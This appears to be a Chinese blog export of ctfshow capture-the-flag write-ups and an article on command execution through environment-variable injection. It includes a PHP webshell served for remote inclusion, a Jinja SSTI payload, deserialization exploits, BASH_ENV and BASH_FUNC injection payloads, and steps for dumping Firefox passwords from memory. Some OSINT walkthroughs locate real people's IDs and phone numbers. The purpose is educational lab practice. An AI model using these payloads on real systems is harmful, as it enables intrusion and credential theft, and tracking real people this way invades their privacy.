    <url>/posts/4da54c25/</url>
    <content><![CDATA[热身进群得码群里发送 击剑杯签到即可
听歌识曲赛后问了群友，可能真的是积累与特征吧大概有两种方法：1：听歌词百度2：直接知道什么歌答案是普京ctfshow&#123;Vladimir_Vladimirovich_Putin&#125;
看图识码网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码用二维码神器cortexscan逐一扫描，然后拼接在一起，就是flag啦
看图识妹直接贴大佬的脚本了注意要下个chromedriver.exe网址,版本要与chrome一致
from time import sleepimport requestsimport itertoolsfrom selenium import webdriverdef force_to_get_ans(session, url):    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&#x27;,        &#x27;Cookie&#x27;: f&#x27;session=&#123;session&#125;&#x27;&#125;    for i in itertools.product([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;], [str(n) for n in range(10)]):        chk = requests.post(f&#x27;&#123;url&#125;/check&#x27;, &#123;&#x27;meizi_id&#x27;: &#x27;&#x27;.join(i)&#125;, headers=headers).text        if &#x27;回答错误，轮数重新开始计算&#x27; not in chk:            return &#x27;&#x27;.join(i)driver = webdriver.Chrome(r&#x27;chromedriver.exe&#x27;)url = &#x27;http://002b1a4d-e639-4e31-b149-dd0fb39d779d.challenge.ctf.show/&#x27;driver.get(f&#x27;&#123;url&#125;/start&#x27;)n = 1while n &lt;= 100:    cke = driver.get_cookie(&#x27;session&#x27;)    ans=force_to_get_ans(cke, url)    driver.find_element_by_name(&#x27;meizi_id&#x27;).send_keys(ans)    driver.find_element_by_xpath(&#x27;/html/body/form/p[4]/button&#x27;).click()    sleep(3)    n+=1s


见微知著远程文件包含先在服务器上用flask搭建一个网页
# coding=utf-8from flask import *app = Flask(__name__)app.secret_key = &#x27;*************************&#x27;@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index():    return &quot;&lt;?php eval($_POST[1]);?&gt;&quot;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)
运行
上传一个.user.ini文件用来远程包含
因为加了头检测，所以需要在文件前加上GIF89a在这个环境中，点也被过滤了，所以需要将ip转为数字在线转换
访问upload即可远程包含
OSINT英语阅读OSINT的全称是Open source intelligence根据这个进行关键词搜索第一篇就是开头就是人名flag为ctfshow&#123;Bill_Donovan&#125;
这是哪里图片很大，将主要信息人物截图再百度搜图在贴吧中得到信息漳州市东山县黄道周公园查询经纬度ctfshow&#123;23.7353_117.5125&#125;
卡鲁铁盒谷歌搜图可以找到原题
根据题目给出的网址搜索编号，找到港口和csc编号注意名称全大写flag:ctfshow&#123;FBV854404_ROTTERDAM&#125;
人家想玩嘛
ctfshow{娱乐项目名称-当地该娱乐项目票价-订票增值税}

百度识图得到位置为迪拜购物中心喷泉
通过谷歌地图可以得知附近的景点lake fountain ride
谷歌搜索lake fountain ride 买票，找到一个可能是官网的地方，标着票价65每人
点右边的在线购票得到增值税为5%
最后的结果要将fountain去掉flag为ctfshow&#123;LAKE_RIDE-65-5%&#125;
人有点多百度识图或者谷歌识图都可以得出地点涩谷，图中是涩谷的标志性街道谷歌地图可以得到店铺名字BIC_CAMERA和电话号码后四位1111BIC_CAMERA有官网，找到线路图，可以得知最近的是副都心线
谷歌或者wiki里都可以得到副都心线的编号为F16
其实上面的线路图已经可以看出出口是B2了，但是这题坑就在这里，还需要在B2前加上个10
flag为ctfshow&#123;BIC_CAMERA-1111-10B2-F16&#125;
小城美食
flag格式：ctfshow{X省X市X区X村X号}

百度识图
关键词搜索
拼接一下，得到浙江省衢州市柯城区龚家埠头村28号
安装Arch
Example ctfshow{BV1GJ411x7h7}

根据pdf中的几个关键信息，白色字幕，虚拟机，安装arch，在b站搜索arch安装，然后通过快速预览的方式粗滤查看，在细看得到结果BV1e3411B79M
WEB给我看看源码
&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);error_reporting(0);require_once(&quot;flag.php&quot;);class whoami&#123;    public $name;    public $your_answer;    public $useless;    public function __construct()&#123;        $this-&gt;name=&#x27;ctfshow第一深情&#x27;;        $this-&gt;your_answer=&#x27;Only you know&#x27;;        $this-&gt;useless=&quot;I_love_u&quot;;    &#125;    public function __wakeup()&#123;        global $flag;        global $you_never_know;        $this-&gt;name=$you_never_know;        if($this-&gt;your_answer === $this-&gt;name)&#123;            echo $flag;        &#125;    &#125;&#125;$secret = $_GET[&#x27;s&#x27;];if(isset($secret))&#123;    if($secret===&quot;给我看看!&quot;)&#123;        extract($_POST);        if($secret===&quot;给我看看!&quot;)&#123;            die(&quot;&lt;script&gt;window.alert(&#x27;这是不能说的秘密&#x27;);location.href=&#x27;https://www.bilibili.com/video/BV1CW411g7UF&#x27;;&lt;/script&gt;&quot;);        &#125;        unserialize($secret);    &#125;&#125;else&#123;    show_source(__FILE__);&#125;
简单的变量覆盖和反序列化exp
&lt;?phpclass whoami&#123;    public $your_answer;    public function __construct()&#123;        $this-&gt;your_answer=&amp;$this-&gt;name;    &#125;&#125;$a = new whoami();echo serialize($a);
代码使用了extract函数，容易构成变量覆盖
谁是CTF之王？exp
import requestsimport rehost = &#x27;http://cab68c18-4dae-4f19-a5c9-4c4b015acf46.challenge.ctf.show&#x27;url = f&#x27;&#123;host&#125;/madlib&#x27;payload = &#123;        &quot;verb&quot;:&quot;&#123;%set x=cycler%&#125;&quot;,        &quot;noun&quot;:&quot;&#123;%set x=x.__init__%&#125;&quot;,        &quot;adjective&quot;:&quot;&#123;%set x=x.__globals__&quot;,        &quot;person&quot;:&quot;os.popen(&#x27;cat f*&#x27;)%&#125;&quot;,        &quot;place&quot;:&quot;&#123;&#123;x.read()&#125;&#125;&quot;        &#125;r = requests.post(url, json=payload)flag = re.findall(r&#x27;ctfshow&#123;.*&#125;&#x27;, r.text)[0]print(flag)

MISC中文识别带师只有十个汉字，用鼠标写出来百度即可要是再多一点就需要用到官方wp中的脚本了
CRYPTO单向加密hint是斐波那契文本中结尾的=I2GWRFMO33EWUZM也是hint，反转后base32解密结果为fibonacci
先用脚本跑出斐波那契数列，然后与文本比较，发现是ascii码，转换一下得到flag
n=0a=0b=1c=1fs=[&#x27;1&#x27;]while 1:	c=b+a	a=b	b=c	if n&gt;128:		break	fs.append(str(b))	n=n+1f=open(&#x27;code.txt&#x27;)d=f.read()flag=[]l=len(fs)while len(d)!=0:    for i in range(l-1,-1,-1):        if d.find(fs[i].strip())==0:            print(fs[i].strip(),i+1)            flag.append(chr(i+1))            d=d[len(fs[i]):]            breakprint(&#x27;&#x27;.join( flag))


PWN炒鸡好玩的井字棋根据给的c代码，可以知道基本判断逻辑，检查输入是否小于3，检查是否有负号但是没有检测棋子的范围，所以可以下在-1这样的位置，用2^32-1来输出-1
先正常下两个相连的棋子[0,0],[0,1]
然后输入[0,4294967295],其实就是[0,-1]三个棋子一条线相连，得到flag
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】吃鸡杯-misc-wp</title>
    <url>/posts/81e3f8e/</url>
    <content><![CDATA[Fortune Cookie动态的misc题目,第一次见，挺有新意的图片下载后发现是png图片，那么就用tweakpng先查看crc报错了，但是图片能打开，所以是图片的宽高被改变了用脚本爆破图片的宽高
import structimport binasciiimport osm = open(&quot;flag.png&quot;,&quot;rb&quot;).read()k=0for i in range(5000):    if k==1:        break    for j in range(5000):        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]        crc = binascii.crc32(c) &amp; 0xffffffff        if crc == 0x91918666:       //crc            k = 1            print(hex(i),hex(j))            break
将图片的宽高修改为爆破出来的值修改后再次用tweakpng查看图片的idat块发现第一个idat块很小，将这个块删除得到原始图片(放个小图，嘿嘿嘿，完整的大家自己做试试吧)用stegsolve查看，会发现3个颜色通道的0通道有”异常”,保存下来仔细观察，会发现左上角存在有规律的偏移用stegsolve的stereogram solver功能进行偏移当偏移到20的时候出现了文字信息，提示已经很明显了，我们换个方向再次进行偏移我在偏移量为187的时候得到了flag
zipper, clipper, not need john the ripper发现在windows下和linux下解压的内容不一样因为windows下的文件夹名是不区分大小写的，解压后会合并
解压后共有58个，猜测是base58用脚本解，注意有几个字母是没有的
import os,base58text = [&#x27;&#x27;] * 1000dic = &#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;for i in dic:    numlist = os.listdir(f&#x27;./file/&#123;i&#125;&#x27;)    for j in numlist:        text[int(j)] = it = base58.b58decode(&#x27;&#x27;.join(text).encode()).decode()print(&#x27;ctfshow&#123;&#x27; + t.split(&#x27;&#123;&#x27;)[1].split(&#x27;&#125;&#x27;)[0] + &#x27;&#125;&#x27;)
这个flag也是动态的
mumuzi的照片根据hint.png，首先爆破base64编码表脚本如下
import base64import stringfrom itertools import permutationswith open(&#x27;im_not_tao_god.txt.encode&#x27;,&#x27;r&#x27;)as f:    a=f.read()with open(&#x27;im_not_tao_god.txt&#x27;,&#x27;rb&#x27;)as b:    b=base64.b64encode(b.read()).decode()with open(&#x27;mumuzi.rar.encode&#x27;,&#x27;r&#x27;)as f:    timu=f.read()l=&#x27;&#x27;k=&#x27;&#x27;for i in range(len(a)):    if a[i] not in l:        l=l+a[i]        k=k+b[i]d=&#123;&#125;x=string.ascii_uppercase+string.ascii_lowercase+string.digits+&quot;+/=&quot;for i in range(len(k)):    d[l[i]]=k[i]yuanwen=&#x27;&#x27;for i in x:    if i not in l:        yuanwen=yuanwen+imiwen=&#x27;&#x27;for i in x:    if i not in k:       miwen=miwen+iprint(yuanwen,miwen)for order in list(permutations(miwen,4)):    for i in range(len(yuanwen)):        d[yuanwen[i]]=order[i]    s=&#x27;&#x27;    for j in timu:        s=s+d[j]    bs=base64.b64decode(s)    with open(&#x27;output\\&#x27;+&#x27;&#x27;.join(order)+&#x27;.rar&#x27;,&#x27;wb&#x27;)as f:        f.write(bs)
爆破后得到一个真的压缩包，其他的压缩包是坏的解压后得到一个helloworld.txt和flag.rar在hint.png中可以得到flag.rar 的密码范围是0-1234用shell脚本爆破先生成密码字典，可以用crunch命令
crunch 1 4 0123456789  &gt;&gt; passwd.txt
while [ -f &quot;rars/flag.rar&quot; ]do	mv ./rars/flag.rar ./rars/flag_.rar	rar2john ./rars/flag_.rar &gt;hash.txt	john hash.txt --wordlist=passwd.txt	password=`john hash.txt --show|head -n1|cut -d&quot;:&quot; -f 2`	unrar e -o+ ./rars/flag_.rar ./rars/ -p$&#123;password&#125;done
爆破了大概一个小时。。。结果还是假的最后得到的txt文件里写着：flag不在这里，你得往回走。
观察最后的flag.rar得知rar文件是有注释的将所有注释提取出来
根据txt的提示，flag得往回走，观察最后一段注释，发现是png文件头反过来，将所有注释连在一起然后reverse，得到png文件
用010打开图片，CRC报错说明宽高被改过了，爆破出正确的宽度然后binwalk可以发现提示：我就知道你们只喜欢loli不喜欢我，我都穿成这样了你还不知道该对我（png，绝对不是mumuzi）做什么么？
说明是brainfuck的brainloller模式，直接bftools一下这个图片就出来了bftools.exe decode brainloller mumuzi.png得到flag
火烤大牛1.0补上PLTE和修改宽高即可
信守着承诺根据提示找到一个信息

信守着承诺


在文件中发现zip结构，用foremost分离后发现一个带密码的压缩包用歌词成功解压结尾处有一串base64加密的字符串解密后就是flag
在？看看密码非预期解直接可以找到flag
预期解利用volatility先imageinfo和pslist分析然后就是找密码了因为firefox的密码管理器db和json文件存放在Roaming\Mozilla\Firefox\profiles\xxxxxxx.default\key4.db和logins.json。所以直接找这两个，然后用github的firefox密码查看器脚本或者用软件即可

先查看在下载volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 filescan |grep ‘key4.db’volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 filescan |grep ‘logins.json’volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d6ab4b0 -D .&#x2F;volatility -f looklookpassword.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003ec70d00 -D .&#x2F;

拿到flag
qcode解压得到很多个二维码图片使用脚本批量扫描
import pyzbar.pyzbar as pyzbarfrom PIL import Imageimport osfrom tqdm import tqdmpath = &#x27;C:\\Users\\username\\Desktop\\qcode&#x27;texts = [&#x27;&#x27;]*9424list = [&#x27;&#x27;]*9424i = 0for filename in os.listdir(path):    list[i] = filename    i += 1print(&#x27;目录文件获取完毕&#x27;)for i in tqdm(range(len(list))):    img = Image.open(path +&#x27;\\&#x27;+ list[i])    texts[i] = pyzbar.decode(img)print(&#x27;图像信息获取完毕&#x27;)i = 0for j in range(len(texts)):    for text in texts[j]:        tmp = text.data.decode(&quot;utf-8&quot;)        if(&#x27;ctfshow&#123;&#x27; in tmp):            print(&#x27;二维码 &#x27; + list[j] + &#x27; 解码出ctfshow：&#x27; + tmp)        if(&#x27;flag&#123;&#x27; in tmp):            print(&#x27;二维码 &#x27; + list[j] + &#x27; 解码出flag：&#x27; + tmp)
得到一个假的flag发现这张图片中还带有zip用binwalk或foremost分离出来解压后有flaag.txt和glb两个文件打开glb文件的百度经验改名为1.glb打开得到两串字符

The key:12


First kaisa second fence key

打开flaag.txt开头是一个假的flag后面是大量的255，用脚本进行画图
from PIL import Imagepic = Image.new(&quot;RGB&quot;,(1000,1000))f = open(&quot;flaag.txt&quot;,&#x27;r&#x27;).readlines()for i in range(len(f)):    s = f[i].split(&#x27;,&#x27;)    for j in range(len(s)):        if(s[j] == &#x27;255&#x27;):            pic.putpixel((j,i),(255,255,255))        elif s[j].find(&#x27;\n&#x27;)&gt;0:            pic.putpixel((j,i),(255,255,255))        else:            pic.putpixel((j,i),(0,0,0))pic.save(&quot;qcode.png&quot;)
得到这样一张图片然后根据key先凯撒12，再栅栏12即可得到flag

od0dfmz_rf_Begfdtxtaam1nifex{u_qOaIy0zm}zefs_qcr0rtan_ft_Psutrhlhooa1bwtsl{i_eCoWm0na}nstg_e     凯撒12ctfshow{C0ngratulations_0n_th1s_Water_Problem}     栅栏12

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】摆烂杯-wp</title>
    <url>/posts/8752bc8/</url>
    <content><![CDATA[摆烂了，没有wp
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>环境变量注入</title>
    <url>/posts/7b50f6ef/</url>
    <content><![CDATA[这篇文章只是对p牛的 我是如何利用环境变量注入执行任意命令 这篇文章进行总结
环境变量注入条件：用户可以控制环境变量，有执行命令的点但命令不可控
例子：
&lt;?phpforeach($_REQUEST[&#x27;envs&#x27;] as $key =&gt; $val) &#123;    putenv(&quot;&#123;$key&#125;=&#123;$val&#125;&quot;);&#125;//... 一些其他代码system(&#x27;echo hello&#x27;);?&gt;


其中PHP的system调用的是系统的popen()，而popen()最终执行的是sh -c &quot;echo hello&quot;


sh通常只是一个软连接。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash。

dashdash源码
ENVmain函数有关环境变量的代码：
if (#ifndef linux		getuid() == geteuid() &amp;&amp; getgid() == getegid() &amp;&amp;#endif		iflag	) &#123;		if ((shinit = lookupvar(&quot;ENV&quot;)) != NULL &amp;&amp; *shinit != &#x27;\0&#x27;) &#123;			read_profile(shinit);		&#125;	&#125;

可以看到代码会先判断iflag的值
#define iflag optlist[3]const char optletters[NOPTS] = &#123;	&#x27;e&#x27;,	&#x27;f&#x27;,	&#x27;I&#x27;,	&#x27;i&#x27;,	&#x27;m&#x27;,	&#x27;n&#x27;,	&#x27;s&#x27;,	&#x27;x&#x27;,	&#x27;v&#x27;,	&#x27;V&#x27;,	&#x27;E&#x27;,	&#x27;C&#x27;,	&#x27;a&#x27;,	&#x27;b&#x27;,	&#x27;u&#x27;,	0,	0,&#125;;options(int cmdline)&#123;	char *p;	int val;	int c;	int login = 0;	if (cmdline)		minusc = NULL;	while ((p = *argptr) != NULL) &#123;		argptr++;		if ((c = *p++) == &#x27;-&#x27;) &#123;			val = 1;      /* ....  */      &#125; else if (c == &#x27;+&#x27;) &#123;			val = 0;		&#125; else &#123;			argptr--;			break;		&#125;		while ((c = *p++) != &#x27;\0&#x27;) &#123;			if (c == &#x27;c&#x27; &amp;&amp; cmdline) &#123;				minusc = p;	/* command is after shell args*/			&#125; else if (c == &#x27;l&#x27; &amp;&amp; cmdline) &#123;				login = 1;			&#125; else if (c == &#x27;o&#x27;) &#123;				minus_o(*argptr, val);				if (*argptr)					argptr++;			&#125; else &#123;				setoption(c, val);			&#125;		&#125;	&#125;	return login;&#125;setoption(int flag, int val)&#123;	int i;	for (i = 0; i &lt; NOPTS; i++)		if (optletters[i] == flag) &#123;			optlist[i] = val;			if (val) &#123;				/* #%$ hack for ksh semantics */				if (flag == &#x27;V&#x27;)					Eflag = 0;				else if (flag == &#x27;E&#x27;)					Vflag = 0;			&#125;			return;		&#125;	sh_error(&quot;Illegal option -%c&quot;, flag);	/* NOTREACHED */&#125;

通过以上代码可以知道setoption函数会解析传入的参数，当传入了-i时，iflag就为1了
结论：所以在dash中需要传入-i参数才能执行read_profile(shinit)，解析ENV变量。但在php的system函数中不能使用
ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo hello&#x27;


PS1、PS4PS1、PS2、PS4这三个环境变量也会被expandstr函数解析
但是PS1有限制，需要进入交互式shell中才能执行

PS4则只能解析变量，无法执行命令

bashbash源码
BASH_ENV在bash中有个和ENV类似的变量：BASH_ENV
直接那上面的payload改：BASH_ENV=&#39;$(id 1&gt;&amp;2)&#39; bash -c &#39;echo hello&#39;
可以发现不需要-i也能执行了

分析这段代码
 /* A non-interactive shell not named `sh&#x27; and not in posix mode reads and    executes commands from $BASH_ENV.  If `su&#x27; starts a shell with `-c cmd&#x27;    and `-su&#x27; as the name of the shell, we want to read the startup files.    No other non-interactive shells read any startup files. */ if (interactive_shell == 0 &amp;&amp; !(su_shell &amp;&amp; login_shell))   &#123;     if (posixly_correct == 0 &amp;&amp; act_like_sh == 0 &amp;&amp; privileged_mode == 0 &amp;&amp;    sourced_env++ == 0)execute_env_file (get_string_value (&quot;BASH_ENV&quot;));     return;   &#125;


从注释中可以看到，当使用sh时，act_like_sh的值会为1，就不会解析BASH_ENV了
if (shell_name[0] == &#x27;s&#x27; &amp;&amp; shell_name[1] == &#x27;h&#x27; &amp;&amp; shell_name[2] == &#x27;\0&#x27;)  act_like_sh++;if (shell_name[0] == &#x27;s&#x27; &amp;&amp; shell_name[1] == &#x27;u&#x27; &amp;&amp; shell_name[2] == &#x27;\0&#x27;)  su_shell++;

所以只能在bash -c的情况下使用
ENV PS1 PROMPT_COMMAND与dash同样，ENV PS1也能使用
      /* bash */      if (act_like_sh == 0 &amp;&amp; no_rc == 0)	&#123;#ifdef SYS_BASHRC#  if defined (__OPENNT)	  maybe_execute_file (_prefixInstallPath(SYS_BASHRC, NULL, 0), 1);#  else	  maybe_execute_file (SYS_BASHRC, 1);#  endif#endif	  maybe_execute_file (bashrc_file, 1);	&#125;      /* sh */      else if (act_like_sh &amp;&amp; privileged_mode == 0 &amp;&amp; sourced_env++ == 0)	execute_env_file (get_string_value (&quot;ENV&quot;));    &#125;  else		/* bash --posix, sh --posix */    &#123;      /* bash and sh */      if (interactive_shell &amp;&amp; privileged_mode == 0 &amp;&amp; sourced_env++ == 0)	execute_env_file (get_string_value (&quot;ENV&quot;));    &#125;

不过必须是通过sh调用，而不是直接使用bash
ENV=&#39;$(id 1&gt;&amp;2)&#39; sh -i -c &quot;echo hello&quot;
PS1用法一样。在bash中还有一个变量PROMPT_COMMAND，设置了这个环境变量后，进入交互式模式前，会执行这个变量里包含的命令
PROMPT_COMMAND=&#39;id&#39; bash
BASH_FUNC_xxx%%variables.c的initialize_shell_variables函数用于将环境变量注册成SHELL的变量

#define BASHFUNC_PREFIX		&quot;BASH_FUNC_&quot;#define BASHFUNC_PREFLEN	10	/* == strlen(BASHFUNC_PREFIX */#define BASHFUNC_SUFFIX		&quot;%%&quot;#define BASHFUNC_SUFFLEN	2	/* == strlen(BASHFUNC_SUFFIX) */

privmode == 0，即不能传入-p参数read_but_dont_execute == 0，即不能传入-n参数STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN)，环境变量名前10个字符等于BASH_FUNC_STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN)，环境变量名后两个字符等于%%STREQN (&quot;() &#123;&quot;, string, 4)，环境变量的值前4个字符等于() &#123;

其实就是根据环境变量的值初始化一个匿名函数，并赋予其名字
例如env $&#39;BASH_FUNC_myfunc%%=() &#123; id; &#125;&#39; bash -c &#39;myfunc&#39;
再将变量名改成system中执行的函数名，就能实现覆盖
env $&#39;BASH_FUNC_echo%%=() &#123; id; &#125;&#39; bash -c &#39;echo hello&#39;


但是设置BASH_FUNC_myfunc%%的方法并不完美，因为BASH_FUNC_是在Bash 4.4下引入的，centos 7的bash版本默认为Bash 4.2
Bash 4.2的补丁
可以看到在4.2下的BASHFUNC_SUFFIX是()，而不是%%

更改payload：env $&#39;BASH_FUNC_echo()=() &#123; id; &#125;&#39; bash -c &quot;echo hello&quot;
解决了文章开头提出的问题

总结



dash
bash
条件



ENV
√
√
sh或者dash下额外的 -i -c 参数


PS1
√
√
交互环境下


BASH_ENV
×
√
可以在 bash -c 时注入任意命令 sh -c 下无效


PROMPT_COMMAND
×
√
交互环境下


BASH_FUNC_xxx%%
√
4.4及以上 √
无


BASH_FUNC_xxx()
√
4.4以前 √
无


shellshock
√
√
存在shellshock漏洞


]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】网络迷踪-wp</title>
    <url>/posts/4ef561fb/</url>
    <content><![CDATA[前言使用到的工具1：百度识图2：谷歌识图3：经纬度定位4：yandex识图
新手上路格式：ctfshow{桥的名字}求的是桥的名字
谷歌识图得到结果为蜈支洲岛
使用百度实景地图查看岛岛屿不是很大，转一圈就看到了ctfshow{情人桥}
初学乍练格式：ctfshow{目的地}可以得知是瑞航的飞机从wiki百科查看机场ctfshow{苏黎世}
初学又练格式：ctfshow{纬度(精确到小数点后四位, 不用进位),经度(精确到小数点后四位, 不用进位)}可以看到右边店面的名字为：sandwichnsmoothies因为在国外，所以直接用谷歌地图搜，用街景看，发现一模一样真的不想做经纬度的题了，数字太难对了ctfshow{55.6382,12.6411}
初学再练格式：ctfshow{军事基地英文}谷歌识图直接得到结果ctfshow{Nagurskoye}
现拉现吃格式：ctfshow{图中店铺全名的拼音（无分隔符和声调、字母全小写）加食物价格（阿拉伯数字）}百度识图找到一个图案一样的碗得到结果为“云峰清真餐厅(南滨河路店)”，因为图片上有大众点评的水印所以在大众点评里找，看到评论里有店面的招牌，得到名字为云峰牛肉面手机app扫码点单可以得知价格为10，但是提交失败百度得到的价格为17ctfshow{yunfengniuroumian17}
初窥门径格式：拍摄者后面的建筑名称，格式ctfshow{建筑名称中文}yandex识图找到类似的图片
转到一篇游记,提到了城市吉萨之后也写到了拍摄地点ctfshow{胡夫金字塔}
狗哥去哪格式：flag为ctfshow{风景区名字，小写拼音}
图片中有微博id，找到号主，翻看相册，没看到啥信息找到博主的B站号，看到一篇vlog，提到了地点
ctfshow{daochengyading}
国足加油格式：ctfshow{日期+体育场名字}一个gif，使用百度识图搜索在这一篇新闻中可以得知日期为2016年3月29日,比赛地点为西安就差场地了，可以通过关键词来百度搜索得知场地为陕西省体育场ctfshow{2016年3月29日陕西省体育场}
致我超吧格式：ctfshow{主角ID_vs_对手id}（全小写）百度识图可以找到一篇知乎文章，提到了这是选手innovation的操作另一篇文章提到对手darkctfshow{innovation_vs_dark}
山外有山格式：ctfshow{山的名字}说实话这个图我一眼就看出来了是珠穆朗玛峰但还是识图确认了一下ctfshow{珠穆朗玛峰}
密集恐惧格式：提交图片所在地的经纬坐标，就网上公开的就成根据积累与特征直接看出是美国飞机坟场当然百度识图也能出ctfshow{32°09’19.17N,110°49’46.69W}
哐啷哐啷格式：ctfshow{火车站名称}谷歌识图可以直接找到ctfshow{和田}
鲶鱼之谜格式：ctfshow{航班号_拍摄时分}，如ctfshow{ab1234_1537}（15时37分拍摄）这题大概是网络迷踪中最难的一题，直接放官网wp了：
part1_航班号：根据照片水印可以找到微博主人，综合8月29号以及之前发的微博可以看出他一直居住在上海，往下翻就能找到这张照片出处，根据评论可以猜测出可能是回天津的航班，根据那条微博的其他照片和发布时间可以推测出航班的起飞时间为18点左右，再通过飞常准app可以查到2021.8.5的航班信息，然后根据飞机的座椅推算出乘坐的航班号为ca1524
part2_拍摄时间：通过飞常准app可以找到航班实际起飞时间为18:27以及平均飞行速度为11.68km&#x2F;min，而当天（2021.8.5）山东的日落时间为19:14:39，再结合上海到济南的直线距离816km左右可以得出，飞机到济南需要70min，此时已经日落了，也就是说，此时的飞机还没飞过济南，且位置在上海和济南之间。
从日落时间19:14开始反推，根据飞机平均速度，在日落前大约能飞549km，以虹桥机场为圆心画一个半径549km的圆，再结合航线判断大概率在江苏上空，再用谷歌地球查看具体时刻的卫星图，可以推算出是在飞机起飞后十分钟之内拍摄的。
从图片可以看出飞机稍微有些倾斜，说明飞机处于爬升阶段，再根据窗外的云层可以判断出此时飞机高度大约为6000米，再用飞常准app查看航线回顾，飞行高度为6000米时飞机位于南通市附近，且处于爬升状态，与之前的推断相吻合，再看具体时刻，大致为18:37，得到flag
ctfshow{ca1524_1837}
这里有轨格式：提交车站名称和车次号，例如：ctfshow{上海T1234}百度搜列车型号相关文章，对比图片得到车型号为CR400BF
识图找到站点千岛湖
根据光线等，不可能是早上和晚上，剩下的爆破一下得到：ctfshow{千岛湖G7498}
爆破不了格式：ctfshow{拍摄者所处建筑的联系手机号}百度识图得到泉州东西塔从照片上看，拍摄者距离景点很近还有图片中房子的走向可以排除镇国塔仁寿塔附近能拍摄的地方不多，基本就锁定了泉州等风民俗ctfshow{18050999086}
目之所及格式：ctfshow{区号-电话}原图的经纬度没有去掉计算方式得到大概位置为莆田市通过百度实景地图找到附近的标志性建筑（虽然我感觉不太像，这个角是平的，图里是尖的）查看附近的景点根据看标志性建筑的角度，加上定位地点，应该是凤凰山公园查看电话号码ctfshow{0594-2680716}
窗外风景格式：ctfshow{目的城市+比赛地点+下一场比赛城市}
来点福利格式：ctfshow{照片中女孩名字_当时住的酒店电话号码}百度识图得到比赛和人物名字
百度搜比赛地点
根据右上角招牌搜到电话
ctfshow{郭敏善_1833-8855}
你的名字大佬们都说能直接搜到但我搜了几圈都没找到，不知道是不是姿势不对这里直接借用了大佬的图片ctfshow{野菜山下商店}
严查外挂格式：’ctfshow{‘ + flag +’|’ + link + ‘}’hint1: flag在举报帖子的图片上hint2: 链接地址不是缓存的网页，是直接访问的链接（404），末尾不带’&#x2F;‘百度关键词可以直接搜到那个404的页面https://www.taptap.com/topic/6820231使用谷歌快照查看文章中的图片得到flag将网址和flag连接起来ctfshow{flag{M1ssInG_T5p1N_P0Wer}|https://www.taptap.com/topic/6820231}
附带导航。。。在群文件中。（群号：372619038）ctfshow{勇敢炫炫，不怕困难}
给你拷上格式：ctfshow{十位纯数字}百度识图找到人物名称微博搜索ctfshow{1928665723}
菜瞎双眼格式：ctfshow{比赛开始日期_比赛名_出题者中文id_原图片文件名_flag{xxxxxx}}这个好难搜翻到第九页才看到得到比赛名红帽杯搜索其他wp文章得到flagflag&#123;d7f1417bfafbf62587e0&#125;和原图片文件名vegetable.png在官网找到时间2019-11-10wp中出现了出题人的id：b1cx百度搜索b1cx,第一个github页面找到中文id菠萝吹雪组合在一起ctfshow{2019-11-10_红帽杯_菠萝吹雪_vegetable.png_flag{d7f1417bfafbf62587e0}}
童年回忆格式：ctfshow{动画片的名称}看右上角为bilibili独播看画风是国产的在国产动画中搜索独家，找到一个造型一致的封面ctfshow{美影大乐园}
我在哪呢。。图片放大，看到广州，常平，樟木头
ctfshow{东莞站}
耳熟能详格式：ctfshow{音频出处}看样子是反转过的，我们利用软件反转回来qq识曲ctfshow{玫瑰花的葬礼}
传统小吃格式：ctfshow{区号-联系电话}老规矩先百度识图找到一张一模一样的图片出自一篇游记找到了地址和店名百度地图ctfshow{0595-22373358}
宇宙大战格式：ctfshow{星系|战斗开始时间}百度识图有很多一模一样的图片，随便点一张找到日期和地点ctfshow{2014-03-25|49-U6U}
食堂轶闻格式：ctfshow{学校名称_锦旗落款日期}百度关键词搜索得到学校名字再次搜索在贴吧中得到图片，拿到日期ctfshow{南方科技大学_2018_09}
三秦套餐格式：ctfshow{所在地广场名称},如ctfshow{天安门广场}根据题目三秦和照片中的老潼关锁定陕西
根据招牌百度得到广场名字
ctfshow{金辉环球广场}
古城豪庭格式：ctfshow{隔壁酒店电话}，ctfshow{区号-电话}
缩小一点百度识图
百度搜西安民乐园文化街附近的酒店得到西安富力希尔顿酒店
ctfshow{029-87388888}
群欺出狱格式：图后面的山的名字和海拔 例如ctfshow{珠穆朗玛峰_635}
直接百度地图可以直接找到位置
附近的几座山百度一下海拔
ctfshow{九华山_741}
Las Vegas历险记-1谷歌可以搜到原题

ctfshow{36.171,-115.139}
